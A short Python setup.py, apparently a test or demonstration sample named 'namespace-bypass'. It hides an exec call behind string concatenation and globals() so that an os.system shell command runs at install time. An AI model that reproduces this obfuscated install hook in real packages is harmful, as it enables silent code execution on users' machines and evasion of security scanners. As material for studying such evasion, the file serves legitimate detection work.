from setuptools import setup
g = globals()
g['ex' + 'ec']('import os; os.system("id")')
setup(name="namespace-bypass", version="1.0.0")
